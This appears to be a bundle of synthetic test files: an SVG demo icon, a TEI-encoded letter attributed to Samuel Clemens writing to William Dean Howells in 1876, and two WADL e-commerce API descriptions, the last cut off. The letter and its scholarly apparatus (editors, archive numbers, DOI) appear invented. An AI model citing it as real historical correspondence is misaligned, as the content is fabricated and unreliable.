<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" 
     height="100" 
     viewBox="0 0 100 100"
     version="1.1">
  
  <title>Sample SVG Icon</title>
  <desc>A sample SVG file demonstrating various SVG elements including shapes, gradients, and text</desc>
  
  <!-- Define gradients and patterns -->
  <defs>
    <linearGradient id="blueGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#4a90e2;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#357abd;stop-opacity:1" />
    </linearGradient>
    
    <radialGradient id="redGradient" cx="50%" cy="50%" r="50%">
      <stop offset="0%" style="stop-color:#ff6b6b;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#d63447;stop-opacity:1" />
    </radialGradient>
    
    <filter id="shadow" x="-50%" y="-50%" width="200%" height="200%">
      <feGaussianBlur in="SourceAlpha" stdDeviation="2"/>
      <feOffset dx="2" dy="2" result="offset"/>
      <feComponentTransfer>
        <feFuncA type="linear" slope="0.3"/>
      </feComponentTransfer>
      <feMerge> 
        <feMergeNode/>
        <feMergeNode in="SourceGraphic"/> 
      </feMerge>
    </filter>
  </defs>
  
  <!-- Background -->
  <rect width="100" height="100" fill="#f8f9fa" stroke="#dee2e6" stroke-width="1"/>
  
  <!-- Main circle with gradient -->
  <circle cx="50" cy="35" r="15" fill="url(#blueGradient)" filter="url(#shadow)"/>
  
  <!-- Rectangle with gradient -->
  <rect x="30" y="55" width="40" height="20" fill="url(#redGradient)" rx="5" ry="5"/>
  
  <!-- Path element - creating a simple house shape -->
  <path d="M 20 80 L 35 65 L 50 80 L 65 65 L 80 80 Z" 
        fill="#2ecc71" 
        stroke="#27ae60" 
        stroke-width="2"/>
  
  <!-- Text element -->
  <text x="50" y="95" 
        font-family="Arial, sans-serif" 
        font-size="8" 
        fill="#343a40" 
        text-anchor="middle">SVG Demo</text>
  
  <!-- Polyline for a simple zigzag -->
  <polyline points="10,20 20,10 30,20 40,10" 
            fill="none" 
            stroke="#6c757d" 
            stroke-width="2"/>
  
  <!-- Ellipse -->
  <ellipse cx="75" cy="25" rx="8" ry="5" fill="#ffc107" stroke="#fd7e14" stroke-width="1"/>
  
  <!-- Use element to reuse shapes -->
  <use href="#star" x="85" y="80" fill="#e83e8c"/>
  
  <!-- Define a reusable star shape -->
  <defs>
    <polygon id="star" points="5,0 6,3 10,3 7,5 8,9 5,7 2,9 3,5 0,3 4,3" fill="#17a2b8"/>
  </defs>
  
  <!-- Group with transformation -->
  <g transform="translate(70, 60) scale(0.8)">
    <rect width="20" height="15" fill="#fd7e14" rx="2"/>
    <circle cx="10" cy="7.5" r="3" fill="#fff"/>
  </g>
  
  <!-- Animation example -->
  <circle cx="15" cy="50" r="3" fill="#dc3545">
    <animate attributeName="r" values="3;6;3" dur="2s" repeatCount="indefinite"/>
    <animate attributeName="fill" values="#dc3545;#28a745;#dc3545" dur="2s" repeatCount="indefinite"/>
  </circle>

</svg>
</file>

<file path="sample_data/test_files_synthetic/small/tei/clemens-howells-letter-1876.xml">
<?xml version="1.0" encoding="UTF-8"?>
<TEI xmlns="http://www.tei-c.org/ns/1.0" xml:id="sample_letter_1876">
  <teiHeader>
    <fileDesc>
      <titleStmt>
        <title>Letter from Samuel Clemens to William Dean Howells</title>
        <title type="sub">Digital Edition</title>
        <author>
          <persName ref="#clemens_samuel">
            <forename>Samuel</forename>
            <surname>Clemens</surname>
          </persName>
        </author>
        <editor>
          <persName ref="#editor_john_smith">
            <forename>John</forename>
            <surname>Smith</surname>
          </persName>
        </editor>
        <respStmt>
          <resp>Transcription</resp>
          <persName ref="#transcriber_jane_doe">Jane Doe</persName>
        </respStmt>
        <respStmt>
          <resp>Encoding</resp>
          <persName ref="#encoder_bob_wilson">Bob Wilson</persName>
        </respStmt>
        <respStmt>
          <resp>Proofreading</resp>
          <persName ref="#proofreader_alice_brown">Alice Brown</persName>
        </respStmt>
        <funder>Digital Humanities Research Grant</funder>
        <principal>
          <persName ref="#principal_investigator">Dr. Margaret Johnson</persName>
        </principal>
      </titleStmt>
      
      <editionStmt>
        <edition>First digital edition</edition>
        <respStmt>
          <resp>Digital editor</resp>
          <persName ref="#digital_editor">Digital Humanities Lab</persName>
        </respStmt>
      </editionStmt>
      
      <extent>
        <measure type="pages" quantity="3"/>
        <measure type="words" quantity="847"/>
        <measure type="characters" quantity="4523"/>
      </extent>
      
      <publicationStmt>
        <publisher>Example University Digital Library</publisher>
        <pubPlace>
          <settlement>Boston</settlement>
          <region>Massachusetts</region>
          <country>United States</country>
        </pubPlace>
        <date when="2025-07-23">July 23, 2025</date>
        <availability status="restricted">
          <licence target="https://creativecommons.org/licenses/by-nc-sa/4.0/">
            <p>This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 
               4.0 International License.</p>
          </licence>
        </availability>
        <idno type="URI">https://digitallib.example.edu/letters/clemens/001</idno>
        <idno type="DOI">10.12345/example.clemens.001</idno>
      </publicationStmt>
      
      <seriesStmt>
        <title>Correspondence of American Authors</title>
        <biblScope unit="volume">3</biblScope>
        <biblScope unit="series">Literary Letters</biblScope>
        <respStmt>
          <resp>Series editor</resp>
          <persName ref="#series_editor">Prof. David Literary</persName>
        </respStmt>
      </seriesStmt>
      
      <sourceDesc>
        <msDesc xml:id="manuscript_original">
          <msIdentifier>
            <institution>Mark Twain Archive</institution>
            <repository>Special Collections</repository>
            <collection>Clemens Papers</collection>
            <idno>MS-CL-1876-045</idno>
            <altIdentifier>
              <idno type="catalog">Cat-567890</idno>
            </altIdentifier>
          </msIdentifier>
          
          <msContents>
            <summary>Personal letter discussing literary projects and publishing concerns</summary>
            <msItem>
              <locus from="1r" to="3v"/>
              <title type="supplied">Letter to William Dean Howells</title>
              <textLang mainLang="en" otherLangs="fr">English with occasional French phrases</textLang>
              <note>Contains discussion of "The Adventures of Tom Sawyer" publication</note>
            </msItem>
          </msContents>
          
          <physDesc>
            <objectDesc form="letter">
              <supportDesc material="paper">
                <support>
                  <material>Paper</material>
                  <watermark>Crown watermark visible</watermark>
                </support>
                <extent>
                  <measure type="leaves" quantity="3"/>
                  <dimensions type="leaf" unit="mm">
                    <height>254</height>
                    <width>203</width>
                  </dimensions>
                </extent>
                <condition>
                  <p>Good condition with minor foxing. Small tear on page 2.</p>
                </condition>
              </supportDesc>
              <layoutDesc>
                <layout columns="1" writtenLines="25">
                  <p>Single column, approximately 25 lines per page</p>
                </layout>
              </layoutDesc>
            </objectDesc>
            
            <handDesc>
              <handNote xml:id="clemens_hand" scope="major" script="cursive">
                <p>Samuel Clemens' characteristic handwriting in black ink</p>
              </handNote>
              <handNote xml:id="secretary_hand" scope="minor" script="print">
                <p>Address written in different hand, possibly secretary</p>
              </handNote>
            </handDesc>
            
            <typeDesc>
              <typeNote>Written entirely by hand</typeNote>
            </typeDesc>
            
            <additions>
              <list>
                <item>Postal stamp affixed to envelope</item>
                <item>Library acquisition stamp on verso of last page</item>
                <item>Pencil annotations in margins by unknown hand</item>
              </list>
            </additions>
            
            <sealDesc>
              <seal>
                <p>Red wax seal, partially intact</p>
              </seal>
            </sealDesc>
          </physDesc>
          
          <history>
            <origin>
              <origDate when="1876-06-15" evidence="internal">June 15, 1876</origDate>
              <origPlace>
                <settlement>Hartford</settlement>
                <region>Connecticut</region>
                <country>United States</country>
              </origPlace>
            </origin>
            <provenance when="1876-06-18">
              <p>Received by William Dean Howells in Boston, June 18, 1876</p>
            </provenance>
            <provenance when="1920">
              <p>Donated to Mark Twain Archive by Howells estate in 1920</p>
            </provenance>
            <acquisition when="1920-03-15">
              <p>Acquired by archive through estate donation, March 15, 1920</p>
            </acquisition>
          </history>
        </msDesc>
        
        <listBibl>
          <head>Related Publications</head>
          <bibl xml:id="published_version_1924">
            <author>Clemens, Samuel</author>
            <title>Letters of Mark Twain</title>
            <editor>Albert Bigelow Paine</editor>
            <pubPlace>New York</pubPlace>
            <publisher>Harper &amp; Brothers</publisher>
            <date>1924</date>
            <biblScope unit="volume">2</biblScope>
            <biblScope unit="page" from="145" to="147"/>
          </bibl>
          <bibl xml:id="critical_edition_1967">
            <author>Clemens, Samuel</author>
            <title>Mark Twain-Howells Letters</title>
            <editor>Henry Nash Smith</editor>
            <editor>William M. Gibson</editor>
            <pubPlace>Cambridge</pubPlace>
            <publisher>Harvard University Press</publisher>
            <date>1960</date>
            <biblScope unit="volume">1</biblScope>
            <biblScope unit="page" from="89" to="92"/>
          </bibl>
        </listBibl>
      </sourceDesc>
    </fileDesc>
    
    <encodingDesc>
      <projectDesc>
        <p>This document is part of the Digital Correspondence Project, which aims to 
           provide scholarly digital editions of 19th-century American literary correspondence.</p>
      </projectDesc>
      
      <samplingDecl>
        <p>Complete transcription of the entire letter</p>
      </samplingDecl>
      
      <editorialDecl>
        <correction>
          <p>Obvious errors have been corrected silently. Original spelling and punctuation 
             have been preserved.</p>
        </correction>
        <normalization method="silent">
          <p>Abbreviations have been expanded only when ambiguous</p>
        </normalization>
        <quotation marks="all">
          <p>All quotation marks have been retained as in the original</p>
        </quotation>
        <hyphenation eol="hard">
          <p>End-of-line hyphenation has been regularized</p>
        </hyphenation>
      </editorialDecl>
      
      <tagsDecl>
        <rendition xml:id="underline" scheme="css">text-decoration: underline;</rendition>
        <rendition xml:id="italic" scheme="css">font-style: italic;</rendition>
        <rendition xml:id="bold" scheme="css">font-weight: bold;</rendition>
        <rendition xml:id="strikethrough" scheme="css">text-decoration: line-through;</rendition>
        <rendition xml:id="superscript" scheme="css">vertical-align: super; font-size: smaller;</rendition>
      </tagsDecl>
      
      <classDecl>
        <taxonomy xml:id="topics">
          <category xml:id="literature">
            <catDesc>Literary discussion</catDesc>
          </category>
          <category xml:id="publishing">
            <catDesc>Publishing and editorial matters</catDesc>
          </category>
          <category xml:id="personal">
            <catDesc>Personal matters and relationships</catDesc>
          </category>
          <category xml:id="travel">
            <catDesc>Travel and places</catDesc>
          </category>
        </taxonomy>
      </classDecl>
    </encodingDesc>
    
    <profileDesc>
      <creation>
        <date when="1876-06-15">June 15, 1876</date>
        <placeName ref="#hartford_ct">Hartford, Connecticut</placeName>
      </creation>
      
      <langUsage>
        <language ident="en" usage="95">English</language>
        <language ident="fr" usage="5">French</language>
      </langUsage>
      
      <textClass>
        <keywords scheme="#topics">
          <term ref="#literature">literature</term>
          <term ref="#publishing">publishing</term>
          <term ref="#personal">personal</term>
        </keywords>
        <classCode scheme="LOC">PS1300-1348</classCode>
      </textClass>
      
      <particDesc>
        <listPerson>
          <person xml:id="clemens_samuel" sex="M">
            <persName>
              <forename>Samuel</forename>
              <forename type="middle">Langhorne</forename>
              <surname>Clemens</surname>
              <addName type="pseudonym">Mark Twain</addName>
            </persName>
            <birth when="1835-11-30" where="#florida_mo"/>
            <death when="1910-04-21" where="#redding_ct"/>
            <occupation>Author, lecturer, humorist</occupation>
            <residence from="1874" to="1891" where="#hartford_ct"/>
          </person>
          <person xml:id="howells_william" sex="M">
            <persName>
              <forename>William</forename>
              <forename type="middle">Dean</forename>
              <surname>Howells</surname>
            </persName>
            <birth when="1837-03-01" where="#martins_ferry_oh"/>
            <death when="1920-05-11" where="#new_york_ny"/>
            <occupation>Author, critic, editor</occupation>
            <affiliation>Atlantic Monthly</affiliation>
          </person>
        </listPerson>
        
        <listPlace>
          <place xml:id="hartford_ct">
            <placeName>Hartford</placeName>
            <region>Connecticut</region>
            <country>United States</country>
            <location>
              <geo>41.7658 -72.6734</geo>
            </location>
          </place>
          <place xml:id="boston_ma">
            <placeName>Boston</placeName>
            <region>Massachusetts</region>
            <country>United States</country>
          </place>
        </listPlace>
      </particDesc>
      
      <settingDesc>
        <setting>
          <name type="place" ref="#hartford_ct">Hartford, Connecticut</name>
          <time when="1876-06-15">June 15, 1876</time>
        </setting>
      </settingDesc>
      
      <correspDesc>
        <correspAction type="sent">
          <persName ref="#clemens_samuel">Samuel Clemens</persName>
          <placeName ref="#hartford_ct">Hartford, Connecticut</placeName>
          <date when="1876-06-15">June 15, 1876</date>
        </correspAction>
        <correspAction type="received">
          <persName ref="#howells_william">William Dean Howells</persName>
          <placeName ref="#boston_ma">Boston, Massachusetts</placeName>
          <date when="1876-06-18">June 18, 1876</date>
        </correspAction>
        <correspContext>
          <ptr type="prev" target="clemens_to_howells_1876_05_12"/>
          <ptr type="next" target="howells_to_clemens_1876_06_22"/>
        </correspContext>
      </correspDesc>
    </profileDesc>
    
    <revisionDesc>
      <change when="2025-07-23" who="#encoder_bob_wilson" status="draft">
        Initial encoding completed
      </change>
      <change when="2025-07-23" who="#proofreader_alice_brown" status="revised">
        First proofreading pass completed
      </change>
    </revisionDesc>
  </teiHeader>
  
  <text>
    <body>
      <div type="letter">
        <opener>
          <dateline>
            <placeName ref="#hartford_ct">Hartford</placeName>
            <date when="1876-06-15">June 15<hi rendition="#superscript">th</hi> 1876</date>
          </dateline>
          <salute>My Dear <persName ref="#howells_william">Howells</persName>,</salute>
        </opener>
        
        <p>I have been thinking over that matter of <title ref="#tom_sawyer">Tom Sawyer</title> 
           again, &amp; I believe I have come to a definite conclusion at last. The book is 
           plainly &amp; simply a <hi rendition="#underline">book for boys &amp; girls</hi>. 
           It is not a book for grown folks. I wrote it for boys &amp; girls, &amp; I think 
           they will like it. But grown people will not read it; <choice>
             <sic>therefour</sic>
             <corr>therefore</corr>
           </choice> it seems to me that it would be wise to publish it as a juvenile book.</p>
        
        <p>I have been considering the matter of illustrations very seriously, &amp; I think 
           we ought to have plenty of them — not elaborate steel engravings, but simple, 
           characteristic drawings that will <emph>help</emph> the story rather than 
           <emph>ornament</emph> it. What do you think about this?</p>
        
        <p>By the way, I have been reading <persName ref="#bret_harte">Bret Harte's</persName> 
           new story in the <title type="journal">Atlantic</title>, &amp; I must say it is 
           <foreign xml:lang="fr">magnifique</foreign>! The man certainly knows how to 
           tell a story. Have you seen his latest piece? It quite puts my own efforts 
           to shame, I'm afraid.</p>
        
        <p>I had a delightful visit from <persName ref="#james_henry">Henry James</persName> 
           last week. We talked for hours about the craft of writing, &amp; I found his 
           insights quite illuminating. He has such a <hi rendition="#italic">refined</hi> 
           way of looking at literature — quite different from my own rough-&amp;-tumble 
           approach, but no less valuable for that.</p>
        
        <p><add place="margin">I meant to mention this earlier</add> I've been working on 
           some new material for lectures this fall. Would you be interested in looking 
           over some of my notes? I value your opinion more than I can say, &amp; your 
           suggestions always prove invaluable.</p>
        
        <p>The weather here has been <hi rendition="#underline">abominable</hi> — hot &amp; 
           humid beyond description. <persName ref="#livy_clemens">Livy</persName> &amp; the 
           children are all well, though little <persName ref="#susy_clemens">Susy</persName> 
           has been somewhat under the weather with a summer cold. Nothing serious, 
           thankfully.</p>
        
        <p>I hope this finds you &amp; <persName ref="#elinor_howells">Mrs. Howells</persName> 
           in good health &amp; spirits. Please give her my kindest regards, &amp; tell her 
           that <persName ref="#livy_clemens">Livy</persName> speaks of her often &amp; 
           with great affection.</p>
        
        <closer>
          <salute>With warmest regards &amp; anticipation of your reply,</salute>
          <salute>I remain,</salute>
          <salute>Your devoted friend,</salute>
          <signed>
            <persName ref="#clemens_samuel">Samuel L. Clemens</persName>
          </signed>
        </closer>
        
        <postscript>
          <label>P.S.</label>
          <p>I nearly forgot to mention — I've been corresponding with 
             <persName ref="#elisha_bliss">Elisha Bliss</persName> about the publication 
             schedule. He seems quite enthusiastic about the project, which is encouraging. 
             More details when we meet next.</p>
        </postscript>
      </div>
    </body>
    
    <back>
      <div type="notes">
        <head>Editorial Notes</head>
        <note xml:id="note_tom_sawyer" anchored="true">
          <p>Reference to "The Adventures of Tom Sawyer," which was published by 
             American Publishing Company in 1876.</p>
        </note>
        <note xml:id="note_bret_harte" anchored="true">
          <p>Bret Harte (1836-1902), American author known for his stories of the 
             American West.</p>
        </note>
        <note xml:id="note_livy_clemens" anchored="true">
          <p>Olivia Langdon Clemens (1845-1904), Samuel Clemens' wife.</p>
        </note>
      </div>
      
      <div type="bibliography">
        <head>References</head>
        <listBibl>
          <bibl xml:id="ref_paine_biography">
            <author>Paine, Albert Bigelow</author>
            <title>Mark Twain: A Biography</title>
            <pubPlace>New York</pubPlace>
            <publisher>Harper &amp; Brothers</publisher>
            <date>1912</date>
          </bibl>
          <bibl xml:id="ref_kaplan_biography">
            <author>Kaplan, Justin</author>
            <title>Mr. Clemens and Mark Twain</title>
            <pubPlace>New York</pubPlace>
            <publisher>Simon &amp; Schuster</publisher>
            <date>1966</date>
          </bibl>
        </listBibl>
      </div>
    </back>
  </text>
</TEI>
</file>

<file path="sample_data/test_files_synthetic/small/wadl/complex_api.wadl">
<?xml version="1.0" encoding="UTF-8"?>
<application xmlns="http://wadl.dev.java.net/2009/02"
             xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    
    <doc title="E-Commerce API v2.0">
        Comprehensive REST API for e-commerce platform with advanced features
        including user management, product catalog, orders, and payments.
    </doc>

    <grammars>
        <include href="schemas/user.xsd" mediaType="application/xml"/>
        <include href="schemas/product.xsd" mediaType="application/xml"/>
        <include href="schemas/order.xsd" mediaType="application/xml"/>
        
        <xsd:schema targetNamespace="http://api.ecommerce.com/types"
                   xmlns:tns="http://api.ecommerce.com/types">
            <xsd:element name="error">
                <xsd:complexType>
                    <xsd:sequence>
                        <xsd:element name="code" type="xsd:int"/>
                        <xsd:element name="message" type="xsd:string"/>
                        <xsd:element name="details" type="xsd:string" minOccurs="0"/>
                    </xsd:sequence>
                </xsd:complexType>
            </xsd:element>
        </xsd:schema>
    </grammars>

    <resources base="https://api.ecommerce.com/v2">
        
        <!-- User Management -->
        <resource path="users">
            <doc>User management endpoints</doc>
            
            <method name="GET" id="listUsers">
                <doc>List all users (admin only)</doc>
                <request>
                    <param name="api_key" style="query" type="xsd:string" required="true">
                        <doc>API key for authentication</doc>
                    </param>
                    <param name="role" style="query" type="xsd:string">
                        <doc>Filter by user role</doc>
                        <option value="admin" mediaType="text/plain"/>
                        <option value="customer" mediaType="text/plain"/>
                        <option value="merchant" mediaType="text/plain"/>
                    </param>
                    <param name="active" style="query" type="xsd:boolean" default="true">
                        <doc>Filter by account status</doc>
                    </param>
                    <param name="page" style="query" type="xsd:int" default="1">
                        <doc>Page number for pagination</doc>
                    </param>
                    <param name="per_page" style="query" type="xsd:int" default="20">
                        <doc>Items per page (max 100)</doc>
                    </param>
                </request>
                <response status="200">
                    <doc>List of users</doc>
                    <representation mediaType="application/json">
                        <doc>JSON array of user objects with pagination metadata</doc>
                    </representation>
                    <representation mediaType="application/xml" element="tns:users">
                        <doc>XML list of users</doc>
                    </representation>
                </response>
                <response status="401">
                    <doc>Unauthorized - invalid API key</doc>
                    <representation mediaType="application/json"/>
                </response>
                <response status="403">
                    <doc>Forbidden - insufficient permissions</doc>
                    <representation mediaType="application/json"/>
                </response>
            </method>
            
            <method name="POST" id="createUser">
                <doc>Create a new user account</doc>
                <request>
                    <param name="Content-Type" style="header" type="xsd:string" required="true" 
                           default="application/json">
                        <doc>Request content type</doc>
                    </param>
                    <representation mediaType="application/json">
                        <doc>User registration data in JSON format</doc>
                    </representation>
                    <representation mediaType="application/xml" element="tns:user">
                        <doc>User registration data in XML format</doc>
                    </representation>
                </request>
                <response status="201">
                    <doc>User created successfully</doc>
                    <representation mediaType="application/json">
                        <doc>Created user object with generated ID</doc>
                    </representation>
                    <representation mediaType="application/xml" element="tns:user">
                        <doc>Created user in XML format</doc>
                    </representation>
                </response>
                <response status="400">
                    <doc>Bad request - validation errors</doc>
                    <representation mediaType="application/json">
                        <doc>Validation error details</doc>
                    </representation>
                </response>
                <response status="409">
                    <doc>Conflict - email already exists</doc>
                    <representation mediaType="application/json"/>
                </response>
            </method>
            
            <resource path="{userId}">
                <doc>Individual user operations</doc>
                <param name="userId" style="template" type="xsd:string" required="true">
                    <doc>Unique user identifier (UUID or username)</doc>
                </param>
                
                <method name="GET" id="getUser">
                    <doc>Retrieve user profile</doc>
                    <request>
                        <param name="Authorization" style="header" type="xsd:string" required="true">
                            <doc>Bearer token or API key</doc>
                        </param>
                        <param name="include_private" style="query" type="xsd:boolean" default="false">
                            <doc>Include private profile data (self or admin only)</doc>
                        </param>
                    </request>
                    <response status="200">
                        <representation mediaType="application/json">
                            <doc>User profile data</doc>
                        </representation>
                        <representation mediaType="application/xml" element="tns:user">
                            <doc>User profile in XML</doc>
                        </representation>
                    </response>
                    <response status="404">
                        <doc>User not found</doc>
                    </response>
                </method>
                
                <method name="PUT" id="updateUser">
                    <doc>Update user profile</doc>
                    <request>
                        <param name="Authorization" style="header" type="xsd:string" required="true">
                            <doc>Bearer token</doc>
                        </param>
                        <param name="If-Match" style="header" type="xsd:string">
                            <doc>ETag for optimistic concurrency control</doc>
                        </param>
                        <representation mediaType="application/json">
                            <doc>Updated user data</doc>
                        </representation>
                    </request>
                    <response status="200">
                        <doc>User updated successfully</doc>
                        <representation mediaType="application/json"/>
                    </response>
                    <response status="409">
                        <doc>Conflict - resource modified by another request</doc>
                    </response>
                    <response status="412">
                        <doc>Precondition failed - ETag mismatch</doc>
                    </response>
                </method>
                
                <resource path="orders">
                    <doc>User's order history</doc>
                    
                    <method name="GET" id="getUserOrders">
                        <doc>Get user's order history</doc>
                        <request>
                            <param name="Authorization" style="header" type="xsd:string" required="true"/>
                            <param name="status" style="query" type="xsd:string">
                                <doc>Filter by order status</doc>
                                <option value="pending"/>
                                <option value="processing"/>
                                <option value="shipped"/>
                                <option value="delivered"/>
                                <option value="cancelled"/>
                            </param>
                            <param name="from_date" style="query" type="xsd:date">
                                <doc>Orders from this date (YYYY-MM-DD)</doc>
                            </param>
                            <param name="to_date" style="query" type="xsd:date">
                                <doc>Orders until this date (YYYY-MM-DD)</doc>
                            </param>
                        </request>
                        <response status="200">
                            <representation mediaType="application/json">
                                <doc>Array of order objects</doc>
                            </representation>
                        </response>
                    </method>
                </resource>
            </resource>
        </resource>
        
        <!-- Product Catalog -->
        <resource path="products">
            <doc>Product catalog management</doc>
            
            <method name="GET" id="searchProducts">
                <doc>Search and filter products</doc>
                <request>
                    <param name="q" style="query" type="xsd:string">
                        <doc>Search query for product name or description</doc>
                    </param>
                    <param name="category" style="query" type="xsd:string" repeating="true">
                        <doc>Filter by category (can specify multiple)</doc>
                    </param>
                    <param name="min_price" style="query" type="xsd:decimal">
                        <doc>Minimum price filter</doc>
                    </param>
                    <param name="max_price" style="query" type="xsd:decimal">
                        <doc>Maximum price filter</doc>
                    </param>
                    <param name="in_stock" style="query" type="xsd:boolean">
                        <doc>Filter by stock availability</doc>
                    </param>
                    <param name="sort" style="query" type="xsd:string" default="relevance">
                        <doc>Sort order</doc>
                        <option value="relevance"/>
                        <option value="price_asc"/>
                        <option value="price_desc"/>
                        <option value="name"/>
                        <option value="newest"/>
                        <option value="rating"/>
                    </param>
                    <param name="Accept-Language" style="header" type="xsd:string">
                        <doc>Preferred language for product descriptions</doc>
                    </param>
                </request>
                <response status="200">
                    <doc>Product search results</doc>
                    <representation mediaType="application/json">
                        <doc>Search results with products and facets</doc>
                    </representation>
                    <representation mediaType="application/xml" element="tns:products">
                        <doc>Product list in XML format</doc>
                    </representation>
                </response>
            </method>
            
            <resource path="{productId}">
                <param name="productId" style="template" type="xsd:string" required="true">
                    <doc>Product identifier (SKU or UUID)</doc>
                </param>
                
                <method name="GET" id="getProduct">
                    <doc>Get detailed product information</doc>
                    <request>
                        <param name="include_variants" style="query" type="xsd:boolean" default="true">
                            <doc>Include product variants and options</doc>
                        </param>
                        <param name="include_reviews" style="query" type="xsd:boolean" default="false">
                            <doc>Include customer reviews</doc>
                        </param>
                    </request>
                    <response status="200">
                        <representation mediaType="application/json">
                            <doc>Complete product information</doc>
                        </representation>
                        <representation mediaType="application/xml" element="tns:product"/>
                    </response>
                    <response status="404">
                        <doc>Product not found</doc>
                        <representation mediaType="application/json"/>
                    </response>
                </method>
                
                <resource path="reviews">
                    <doc>Product reviews and ratings</doc>
                    
                    <method name="GET" id="getProductReviews">
                        <doc>Get product reviews</doc>
                        <request>
                            <param name="rating" style="query" type="xsd:int">
                                <doc>Filter by star rating (1-5)</doc>
                            </param>
                            <param name="verified_only" style="query" type="xsd:boolean" default="false">
                                <doc>Show only verified purchase reviews</doc>
                            </param>
                        </request>
                        <response status="200">
                            <representation mediaType="application/json"/>
                        </response>
                    </method>
                    
                    <method name="POST" id="createReview">
                        <doc>Submit a product review</doc>
                        <request>
                            <param name="Authorization" style="header" type="xsd:string" required="true">
                                <doc>User authentication token</doc>
                            </param>
                            <representation mediaType="application/json">
                                <doc>Review data including rating and comment</doc>
                            </representation>
                        </request>
                        <response status="201">
                            <doc>Review created successfully</doc>
                            <representation mediaType="application/json"/>
                        </response>
                        <response status="400">
                            <doc>Invalid review data</doc>
                        </response>
                        <response status="409">
                            <doc>User has already reviewed this product</doc>
                        </response>
                    </method>
                </resource>
            </resource>
        </resource>
        
        <!-- Orders -->
        <resource path="orders">
            <doc>Order management</doc>
            
            <method name="POST" id="createOrder">
                <doc>Create a new order</doc>
                <request>
                    <param name="Authorization" style="header" type="xsd:string" required="true"/>
                    <param name="Idempotency-Key" style="header" type="xsd:string">
                        <doc>Unique key to prevent duplicate orders</doc>
                    </param>
                    <representation mediaType="application/json">
                        <doc>Order data with items, shipping, and payment info</doc>
                    </representation>
                </request>
                <response status="201">
                    <doc>Order created successfully</doc>
                    <representation mediaType="application/json">
                        <doc>Created order with ID and status</doc>
                    </representation>
                </response>
                <response status="400">
                    <doc>Invalid order data</doc>
                </response>
                <response status="402">
                    <doc>Payment required - insufficient funds or invalid payment method</doc>
                </response>
            </method>
            
            <resource path="{orderId}">
                <param name="orderId" style="template" type="xsd:string" required="true"/>
                
                <method name="GET" id="getOrder">
                    <doc>Get order details</doc>
                    <request>
                        <param name="Authorization" style="header" type="xsd:string" required="true"/>
                    </request>
                    <response status="200">
                        <representation mediaType="application/json"/>
                        <representation mediaType="application/xml" element="tns:order"/>
                    </response>
                </method>
                
                <method name="PATCH" id="updateOrderStatus">
                    <doc>Update order status (admin/merchant only)</doc>
                    <request>
                        <param name="Authorization" style="header" type="xsd:string" required="true"/>
                        <representation mediaType="application/json">
                            <doc>Status update with optional tracking information</doc>
                        </representation>
                    </request>
                    <response status="200">
                        <doc>Order status updated</doc>
                        <representation mediaType="application/json"/>
                    </response>
                    <response status="403">
                        <doc>Insufficient permissions</doc>
                    </response>
                </method>
            </resource>
        </resource>
    </resources>
</application>
</file>

<file path="sample_data/test_files_synthetic/small/wadl/ecommerce-api.wadl">
<?xml version="1.0" encoding="UTF-8"?>
<application xmlns="http://wadl.dev.java.net/2009/02"
             xmlns:xsd="http://www.w3.org/2001/XMLSchema"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://wadl.dev.java.net/2009/02 wadl.xsd">

  <doc title="E-Commerce REST API Documentation">
    A comprehensive REST API for an e-commerce platform providing endpoints for 
    product management, user authentication, order processing, and inventory management.
    
    Base URL: https://api.example-store.com/v2
    API Version: 2.1
    Last Updated: July 23, 2025
  </doc>

  <!-- Global grammar definitions -->
  <grammars>
    <include href="schemas/product.xsd"/>
    <include href="schemas/user.xsd"/>
    <include href="schemas/order.xsd"/>
    
    <!-- Inline schema definitions -->
    <xsd:schema elementFormDefault="qualified" targetNamespace="http://api.example-store.com/schemas">
      
      <!-- Error response schema -->
      <xsd:element name="error">
        <xsd:complexType>
          <xsd:sequence>
            <xsd:element name="code" type="xsd:int"/>
            <xsd:element name="message" type="xsd:string"/>
            <xsd:element name="details" type="xsd:string" minOccurs="0"/>
            <xsd:element name="timestamp" type="xsd:dateTime"/>
            <xsd:element name="path" type="xsd:string"/>
          </xsd:sequence>
        </xsd:complexType>
      </xsd:element>
      
      <!-- Product schema -->
      <xsd:element name="product">
        <xsd:complexType>
          <xsd:sequence>
            <xsd:element name="id" type="xsd:long"/>
            <xsd:element name="name" type="xsd:string"/>
            <xsd:element name="description" type="xsd:string" minOccurs="0"/>
            <xsd:element name="price" type="xsd:decimal"/>
            <xsd:element name="currency" type="xsd:string"/>
            <xsd:element name="category" type="xsd:string"/>
            <xsd:element name="sku" type="xsd:string"/>
            <xsd:element name="inStock" type="xsd:boolean"/>
            <xsd:element name="quantity" type="xsd:int"/>
            <xsd:element name="imageUrls" type="xsd:string" maxOccurs="unbounded" minOccurs="0"/>
            <xsd:element name="createdAt" type="xsd:dateTime"/>
            <xsd:element name="updatedAt" type="xsd:dateTime"/>
          </xsd:sequence>
        </xsd:complexType>
      </xsd:element>
      
      <!-- Product list schema -->
      <xsd:element name="products">
        <xsd:complexType>
          <xsd:sequence>
            <xsd:element ref="product" maxOccurs="unbounded"/>
          </xsd:sequence>
          <xsd:attribute name="total" type="xsd:int"/>
          <xsd:attribute name="page" type="xsd:int"/>
          <xsd:attribute name="size" type="xsd:int"/>
        </xsd:complexType>
      </xsd:element>
      
    </xsd:schema>
  </grammars>

  <!-- Resource type definitions for reuse -->
  <resource_type id="collection">
    <doc>Generic collection resource with pagination support</doc>
    
    <method name="GET">
      <doc>Retrieve a paginated list of resources</doc>
      <request>
        <param name="page" style="query" type="xsd:int" default="1">
          <doc>Page number (1-based)</doc>
        </param>
        <param name="size" style="query" type="xsd:int" default="20">
          <doc>Number of items per page (max 100)</doc>
        </param>
        <param name="sort" style="query" type="xsd:string" default="id">
          <doc>Sort field name</doc>
        </param>
        <param name="order" style="query" type="xsd:string" default="asc">
          <doc>Sort order: asc or desc</doc>
          <option value="asc"/>
          <option value="desc"/>
        </param>
      </request>
      <response status="200">
        <doc>Successful response with paginated results</doc>
      </response>
      <response status="400">
        <doc>Bad request - invalid parameters</doc>
        <representation mediaType="application/json" element="error"/>
      </response>
      <response status="500">
